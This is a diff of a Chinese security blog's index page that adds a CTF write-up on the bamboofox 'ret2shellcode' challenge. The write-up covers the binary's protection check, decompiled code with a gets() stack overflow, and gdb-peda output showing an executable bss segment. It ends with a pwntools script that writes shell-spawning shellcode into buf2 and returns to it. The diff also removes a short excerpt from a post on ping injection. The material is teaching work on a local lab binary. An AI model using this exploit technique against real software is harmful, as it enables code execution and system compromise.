@@ -194,6 +194,97 @@
             
 
   
+    <article id="post-ret2shellcode" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+  
+  
+    <h1 itemprop="name">
+	
+	  <a class="article-title" href="/2020/12/04/ret2shellcode/" target="_blank">ret2shellcode</a>
+  
+    </h1>
+  
+
+
+  
+  
+<a href="/2020/12/04/ret2shellcode/" class="archive-article-date">
+        <time datetime="2020-12-04T08:36:58.415Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-12-04</time>
+</a>
+
+  
+  
+    
+
+  
+  </header>
+  
+  <div class="article-entry" itemprop="articleBody">
+    
+    <h1 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>ret2shellcode，即控制程序执行 shellcode 代码。shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。<strong>一般来说，shellcode 需要我们自己填充。这其实是另外一种典型的利用方法，即此时我们需要自己去填充一些可执行的代码。</strong></p>
+<p>在栈溢出的基础上，要想执行 shellcode，需要对应的 binary 在运行时，shellcode 所在的区域具有可执行权限。</p>
+<h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><p>这里我们以 bamboofox 中的 ret2shellcode 为例</p>
+<p>首先检测程序开启的保护</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] &#39;&#x2F;home&#x2F;seamiloak&#x2F;Desktop&#x2F;ret2shellcode&#39;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>
+
+<p>可以看出源程序几乎没有开启任何保护，并且有可读，可写，可执行段。我们再使用 IDA 看一下程序</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char s; &#x2F;&#x2F; [esp+1Ch] [ebp-64h]</span><br><span class="line"></span><br><span class="line">  setvbuf(stdout, 0, 2, 0);</span><br><span class="line">  setvbuf(stdin, 0, 1, 0);</span><br><span class="line">  puts(&quot;No system for you this time !!!&quot;);</span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  strncpy(buf2, &amp;s, 0x64u);</span><br><span class="line">  printf(&quot;bye bye ~&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看出，程序仍然是基本的栈溢出漏洞，不过这次还同时将对应的字符串复制到 buf2 处。简单查看可知 buf2 在 bss 段。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.bss:0804A080                 public buf2</span><br><span class="line">.bss:0804A080 ; char buf2[100]</span><br></pre></td></tr></table></figure>
+
+<p>这时，我们简单的调试下程序，看看这一个 bss 段是否可执行。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ b main </span><br><span class="line">Breakpoint 1 at 0x8048536: file ret2shellcode.c, line 8.</span><br><span class="line">gdb-peda$ r</span><br><span class="line">Starting program: &#x2F;home&#x2F;seamiloak&#x2F;Desktop&#x2F;ret2shellcode </span><br><span class="line"></span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0xf7fb4dd8 --&gt; 0xffffd09c --&gt; 0xffffd29b (&quot;CLUTTER_IM_MODULE&#x3D;xim&quot;)</span><br><span class="line">EBX: 0x0 </span><br><span class="line">ECX: 0xfaa899a4 </span><br><span class="line">EDX: 0xffffd024 --&gt; 0x0 </span><br><span class="line">ESI: 0xf7fb3000 --&gt; 0x1d7d8c </span><br><span class="line">EDI: 0x0 </span><br><span class="line">EBP: 0xffffcff8 --&gt; 0x0 </span><br><span class="line">ESP: 0xffffcf70 --&gt; 0x0 </span><br><span class="line">EIP: 0x8048536 (&lt;main+9&gt;:	mov    eax,ds:0x804a060)</span><br><span class="line">EFLAGS: 0x283 (CARRY parity adjust zero SIGN trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x804852e &lt;main+1&gt;:	mov    ebp,esp</span><br><span class="line">   0x8048530 &lt;main+3&gt;:	and    esp,0xfffffff0</span><br><span class="line">   0x8048533 &lt;main+6&gt;:	add    esp,0xffffff80</span><br><span class="line">&#x3D;&gt; 0x8048536 &lt;main+9&gt;:	mov    eax,ds:0x804a060</span><br><span class="line">   0x804853b &lt;main+14&gt;:	mov    DWORD PTR [esp+0xc],0x0</span><br><span class="line">   0x8048543 &lt;main+22&gt;:	mov    DWORD PTR [esp+0x8],0x2</span><br><span class="line">   0x804854b &lt;main+30&gt;:	mov    DWORD PTR [esp+0x4],0x0</span><br><span class="line">   0x8048553 &lt;main+38&gt;:	mov    DWORD PTR [esp],eax</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xffffcf70 --&gt; 0x0 </span><br><span class="line">0004| 0xffffcf74 --&gt; 0x1 </span><br><span class="line">0008| 0xffffcf78 --&gt; 0xf7ffd940 --&gt; 0x0 </span><br><span class="line">0012| 0xffffcf7c --&gt; 0xc2 </span><br><span class="line">0016| 0xffffcf80 --&gt; 0x0 </span><br><span class="line">0020| 0xffffcf84 --&gt; 0xc30000 </span><br><span class="line">0024| 0xffffcf88 --&gt; 0x0 </span><br><span class="line">0028| 0xffffcf8c --&gt; 0xf7ffd000 --&gt; 0x26f34 </span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line"></span><br><span class="line">Breakpoint 1, main () at ret2shellcode.c:8</span><br><span class="line">8	ret2shellcode.c: 没有那个文件或目录.</span><br><span class="line">gdb-peda$ vmmap </span><br><span class="line">Start      End        Perm	Name</span><br><span class="line">0x08048000 0x08049000 r-xp	&#x2F;home&#x2F;seamiloak&#x2F;Desktop&#x2F;ret2shellcode</span><br><span class="line">0x08049000 0x0804a000 r-xp	&#x2F;home&#x2F;seamiloak&#x2F;Desktop&#x2F;ret2shellcode</span><br><span class="line">0x0804a000 0x0804b000 rwxp	&#x2F;home&#x2F;seamiloak&#x2F;Desktop&#x2F;ret2shellcode</span><br><span class="line">0xf7ddb000 0xf7fb0000 r-xp	&#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc-2.27.so</span><br><span class="line">0xf7fb0000 0xf7fb1000 ---p	&#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc-2.27.so</span><br><span class="line">0xf7fb1000 0xf7fb3000 r-xp	&#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc-2.27.so</span><br><span class="line">0xf7fb3000 0xf7fb4000 rwxp	&#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc-2.27.so</span><br><span class="line">0xf7fb4000 0xf7fb7000 rwxp	mapped</span><br><span class="line">0xf7fcf000 0xf7fd1000 rwxp	mapped</span><br><span class="line">0xf7fd1000 0xf7fd4000 r--p	[vvar]</span><br><span class="line">0xf7fd4000 0xf7fd6000 r-xp	[vdso]</span><br><span class="line">0xf7fd6000 0xf7ffc000 r-xp	&#x2F;lib&#x2F;i386-linux-gnu&#x2F;ld-2.27.so</span><br><span class="line">0xf7ffc000 0xf7ffd000 r-xp	&#x2F;lib&#x2F;i386-linux-gnu&#x2F;ld-2.27.so</span><br><span class="line">0xf7ffd000 0xf7ffe000 rwxp	&#x2F;lib&#x2F;i386-linux-gnu&#x2F;ld-2.27.so</span><br><span class="line">0xfffdd000 0xffffe000 rwxp	[stack]</span><br></pre></td></tr></table></figure>
+
+<p>通过 vmmap，我们可以看到 bss 段对应的段具有可执行权限<br><code>0x0804a000 0x0804b000 rwxp    /home/seamiloak/Desktop/ret2shellcode</code><br>那么这次我们就控制程序执行 shellcode，也就是读入 shellcode，然后控制程序执行 bss 段处的 shellcode。其中，相应的偏移计算类似于 ret2text 中的例子。</p>
+<p>具体的 payload 如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh &#x3D; process(&#39;.&#x2F;ret2shellcode&#39;)</span><br><span class="line">shellcode &#x3D; asm(shellcraft.sh())</span><br><span class="line">buf2_addr &#x3D; 0x804a080</span><br><span class="line"></span><br><span class="line">sh.sendline(shellcode.ljust(112, &#39;A&#39;) + p32(buf2_addr))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+    
+
+    
+
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+    
+
+    
+    <p class="article-more-link">
+      <a class="article-more-a" href="/2020/12/04/ret2shellcode/">展开全文 >></a>
+    </p>
+    
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-gcc命令" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -866,81 +957,6 @@
     
     <p class="article-more-link">
       <a class="article-more-a" href="/2020/09/05/preg-match%E7%BB%95%E8%BF%87/">展开全文 >></a>
-    </p>
-    
-
-    
-    <div class="clearfix"></div>
-  </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-ping注入" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-  
-  
-    <h1 itemprop="name">
-	
-	  <a class="article-title" href="/2020/09/05/ping%E6%B3%A8%E5%85%A5/" target="_blank">ping注入</a>
-  
-    </h1>
-  
-
-
-  
-  
-<a href="/2020/09/05/ping%E6%B3%A8%E5%85%A5/" class="archive-article-date">
-        <time datetime="2020-09-05T13:56:10.520Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-09-05</time>
-</a>
-
-  
-  
-    
-
-  
-  </header>
-  
-  <div class="article-entry" itemprop="articleBody">
-    
-    <h1 id="0x01-ICMP协议与ping命令"><a href="#0x01-ICMP协议与ping命令" class="headerlink" title="0x01 ICMP协议与ping命令"></a>0x01 ICMP协议与ping命令</h1><h2 id="0x11-ping什么？"><a href="#0x11-ping什么？" class="headerlink" title="0x11 ping什么？"></a>0x11 ping什么？</h2><p>在网络中ping是一个十分强大的TCP/IP工具。它的作用主要为：<br>（1）用来检测网络的连通情况和分析网络速度；<br>（2）根据域名得到服务器IP；<br>（3）根据ping返回的TTL值来判断对方所使用的操作系统及数据包经过路由器数量。我们通常会用它来直接ping IP地址，来测试网络的连通情况。</p>
-    
-    
-
-    
-
-    
-
-  </div>
-  <div class="article-info article-info-index">
-    
-    
-    
-
-    
-    <p class="article-more-link">
-      <a class="article-more-a" href="/2020/09/05/ping%E6%B3%A8%E5%85%A5/">展开全文 >></a>
     </p>
     
 
